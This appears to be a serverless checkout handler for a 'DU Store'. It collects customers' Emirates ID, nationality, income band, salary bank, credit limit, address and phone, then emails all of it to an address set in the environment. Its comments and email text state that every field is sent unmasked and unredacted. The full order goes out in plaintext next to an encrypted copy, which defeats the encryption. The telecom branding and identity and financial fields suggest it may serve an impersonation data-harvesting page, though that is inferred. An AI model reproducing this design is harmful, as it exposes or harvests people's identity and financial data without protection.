const json = (status, body) =>
  new Response(JSON.stringify(body), {
    status,
    headers: {
      "Content-Type": "application/json",
      "Cache-Control": "no-store"
    }
  });

function toBase64(bytes) {
  let binary = "";
  for (const byte of bytes) {
    binary += String.fromCharCode(byte);
  }
  return btoa(binary);
}

async function encryptPayload(value, secret) {
  const encoder = new TextEncoder();

  // Create a 256-bit key from the server-side secret.
  const keyBytes = await crypto.subtle.digest(
    "SHA-256",
    encoder.encode(secret)
  );

  const key = await crypto.subtle.importKey(
    "raw",
    keyBytes,
    { name: "AES-GCM" },
    false,
    ["encrypt"]
  );

  // AES-GCM uses a 12-byte random IV.
  const iv = crypto.getRandomValues(new Uint8Array(12));

  const encryptedBuffer = await crypto.subtle.encrypt(
    { name: "AES-GCM", iv, tagLength: 128 },
    key,
    encoder.encode(JSON.stringify(value))
  );

  // Web Crypto appends the 16-byte authentication tag.
  // Separate it to preserve your original email format.
  const encrypted = new Uint8Array(encryptedBuffer);
  const ciphertext = encrypted.slice(0, encrypted.length - 16);
  const authTag = encrypted.slice(encrypted.length - 16);

  return {
    algorithm: "AES-256-GCM",
    iv: toBase64(iv),
    authTag: toBase64(authTag),
    ciphertext: toBase64(ciphertext)
  };
}

function escapeHtml(value) {
  return String(value ?? "").replace(/[&<>"']/g, ch => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;"
  }[ch]));
}

export async function onRequestPost({ request, env }) {
  const {
    RESEND_API_KEY,
    ORDER_NOTIFICATION_EMAIL,
    RESEND_FROM_EMAIL,
    ORDER_ENCRYPTION_SECRET
  } = env;

  if (
    !RESEND_API_KEY ||
    !ORDER_NOTIFICATION_EMAIL ||
    !RESEND_FROM_EMAIL ||
    !ORDER_ENCRYPTION_SECRET
  ) {
    return json(500, {
      ok: false,
      error: "Order notifications are not configured on the server."
    });
  }

  let body;

  try {
    body = await request.json();
  } catch {
    return json(400, {
      ok: false,
      error: "Invalid request."
    });
  }

  const order = body && body.order;

  if (!order || typeof order !== "object" || Array.isArray(order)) {
    return json(400, {
      ok: false,
      error: "Missing order details."
    });
  }

  const customerName = String(order.fullName || "").trim().slice(0, 160);
  const customerPhone = String(order.mobileNumber || "").trim().slice(0, 40);
  const reference = String(order.orderReference || "").trim().slice(0, 40);

  if (!customerName || !customerPhone || !reference) {
    return json(400, {
      ok: false,
      error: "Customer name, phone number and order reference are required."
    });
  }

  // ---------------------------------------------------------------
  // FULL PAYLOAD — every field the client submitted is included
  // exactly as received. No masking, no redaction, no field removal.
  // ---------------------------------------------------------------
  const fullOrder = { ...order };

  let encrypted;
  try {
    encrypted = await encryptPayload(fullOrder, ORDER_ENCRYPTION_SECRET);
  } catch (error) {
    console.error("Encryption failed:", error.message);
    return json(500, {
      ok: false,
      error: "Could not securely process the order."
    });
  }

  const encryptedText = JSON.stringify(encrypted, null, 2);
  const fullOrderText = JSON.stringify(fullOrder, null, 2);

  // Human-readable summary block so the inbox email is usable at a glance.
  const summaryRows = [
    ["Order reference", fullOrder.orderReference],
    ["Timestamp", fullOrder.orderTimestamp],
    ["Employee reference", fullOrder.employeeReference],
    ["Employee name", fullOrder.employeeName],
    ["Customer name", fullOrder.fullName],
    ["Nationality", fullOrder.nationality],
    ["Emirates ID", fullOrder.emiratesId],
    ["Emirates ID expiry", fullOrder.emiratesIdExpiry],
    ["Mobile number", fullOrder.mobileNumber],
    ["Email", fullOrder.email],
    ["Monthly income band", fullOrder.monthlyIncomeBand],
    ["Salary transfer bank", fullOrder.salaryTransferBank],
    ["Shipping address", fullOrder.shippingAddress],
    ["Area / community", fullOrder.areaCommunity],
    ["City / Emirate", fullOrder.cityEmirate],
    ["P.O. Box", fullOrder.poBox],
    ["Device", fullOrder.deviceName],
    ["Device family", fullOrder.deviceFamily],
    ["Device year", fullOrder.deviceYear],
    ["Display", fullOrder.deviceDisplay],
    ["Chip", fullOrder.deviceChip],
    ["Camera", fullOrder.deviceCamera],
    ["Storage", fullOrder.deviceStorage],
    ["Colour", fullOrder.deviceColor],
    ["Device price / month", fullOrder.devicePriceMonthly],
    ["Device VAT / month", fullOrder.deviceVatMonthly],
    ["Device monthly total", fullOrder.deviceMonthlyTotal],
    ["Plan name", fullOrder.planName],
    ["Plan data", fullOrder.planData],
    ["Plan type", fullOrder.planType],
    ["Plan price", fullOrder.planPrice],
    ["Payment method", fullOrder.paymentMethod],
    ["Available credit limit", fullOrder.availableCreditLimit],
    ["Down payment (AED)", fullOrder.downPaymentAED],
    ["AECB consent", fullOrder.aecbConsent],
    ["PDPL consent", fullOrder.pdplConsent],
    ["Terms consent", fullOrder.termsConsent]
  ]
    .filter(([, v]) => v !== undefined && v !== null && v !== "")
    .map(
      ([k, v]) =>
        `<tr>
          <td style="padding:6px 10px;border-bottom:1px solid #eee;font-weight:600;color:#333;width:38%">${escapeHtml(k)}</td>
          <td style="padding:6px 10px;border-bottom:1px solid #eee;color:#111;word-break:break-word">${escapeHtml(v)}</td>
        </tr>`
    )
    .join("");

  const html = `
    <div style="font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;max-width:720px;margin:0 auto;color:#222">
      <div style="background:linear-gradient(135deg,#7b2ff7,#2d6cff,#f107a3);color:#fff;padding:20px 24px;border-radius:12px 12px 0 0">
        <h2 style="margin:0;font-size:20px">New DU Store order</h2>
        <p style="margin:6px 0 0;font-size:13px;opacity:.9">Reference: <strong>${escapeHtml(reference)}</strong></p>
      </div>

      <div style="border:1px solid #e5e7eb;border-top:0;border-radius:0 0 12px 12px;padding:20px 24px">
        <h3 style="margin:0 0 12px;font-size:15px;color:#111">Order summary</h3>
        <table style="width:100%;border-collapse:collapse;font-size:13px">
          ${summaryRows}
        </table>

        <h3 style="margin:24px 0 8px;font-size:15px;color:#111">Full order object (plaintext)</h3>
        <p style="margin:0 0 8px;font-size:12px;color:#666">
          Complete order as received from the browser — nothing removed, nothing masked.
        </p>
        <pre style="white-space:pre-wrap;word-break:break-all;background:#f6f8fb;padding:14px;border-radius:8px;font-size:11.5px;line-height:1.5;max-height:400px;overflow:auto;border:1px solid #e5e7eb">${escapeHtml(fullOrderText)}</pre>

        <h3 style="margin:24px 0 8px;font-size:15px;color:#111">Encrypted payload (AES-256-GCM)</h3>
        <p style="margin:0 0 8px;font-size:12px;color:#666">
          Use the decryptor with <code>ORDER_ENCRYPTION_SECRET</code> to verify. Contains every field above.
        </p>
        <pre style="white-space:pre-wrap;word-break:break-all;background:#0a0e1c;color:#b8f5d0;padding:14px;border-radius:8px;font-size:11.5px;line-height:1.5;max-height:400px;overflow:auto">${escapeHtml(encryptedText)}</pre>

        <p style="margin:20px 0 0;font-size:11px;color:#999;text-align:center">
          Sent from the DU Store checkout · All fields captured exactly as submitted
        </p>
      </div>
    </div>
  `;

  try {
    const resendResponse = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${RESEND_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        from: RESEND_FROM_EMAIL,
        to: [ORDER_NOTIFICATION_EMAIL],
        subject: `DU Store order ${reference} — ${customerName}`,
        html
      })
    });

    if (!resendResponse.ok) {
      const errorText = await resendResponse.text();

      console.error(
        "Resend request failed:",
        resendResponse.status,
        errorText.slice(0, 500)
      );

      return json(502, {
        ok: false,
        error: "Email delivery failed. Please try again later."
      });
    }

    return json(200, {
      ok: true,
      reference
    });

  } catch (error) {
    console.error("Resend connection error:", error.message);

    return json(502, {
      ok: false,
      error: "Email service is temporarily unavailable."
    });
  }
}
